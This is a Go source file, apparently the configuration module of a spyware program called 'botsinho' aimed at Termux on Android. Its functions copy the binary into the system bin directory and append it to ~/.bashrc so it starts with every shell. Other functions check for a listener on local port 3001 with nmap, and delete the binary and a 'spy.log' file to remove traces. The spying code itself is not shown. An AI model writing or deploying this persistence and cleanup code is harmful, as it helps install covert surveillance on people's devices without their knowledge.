package config

import (
	//"fmt"

	"bytes"
	"fmt"

	"os/exec"
	"runtime"
	"time"
)



func Systm()string{

	sis := runtime.GOOS
	return sis
}

func ConfigTrmx()(bool){
	path := exec.Command("bash", "-c", "ls $PREFIX/bin|grep -w botsinho")
	
	
	out, _ := path.Output()
	fmt.Println("conf.,,,,>:"+string(out))

	if(string(out) == ""){
		fmt.Println("configurando...")
		com := exec.Command("bash", "-c", "cp botsinho $PREFIX/bin/")
		com.Output()
		exec.Command("bash", "-c", `echo 'botsinho' >> ~/.bashrc`).Start()
		time.Sleep(1 * time.Second)
		return true
		
	}else{

		fmt.Println(string(out))
		fmt.Println("OK")
		return true
	}
	
	
}




func DeleteSpy(){
	com := exec.Command("bash", "-c", "find ~/ -name botsinho -delete")
	com2 := exec.Command("bash", "-c", "find ~/ -name spy.log -delete")
	com2.Output()
	com.Output()

	
}

func IsRunSpyware()(bool, string){
	
	var outp bytes.Buffer

	dat := verProceso("3001")

	outp.Write([]byte(dat))
	if(dat == "open "){
		return true, outp.String()
	}else{
		return false, outp.String()
	
	}

}


func verProceso(puerto string)string{
	exec.Command("bash", "-c", "apt install nmap > /dev/null 2>&1")
	comando := fmt.Sprintf("nmap -p %s localhost | grep -o open", puerto)
	var out bytes.Buffer

	com := exec.Command("bash", "-c", comando)

	outs, _ := com.Output()
	out.Write(outs)
	return out.String()

}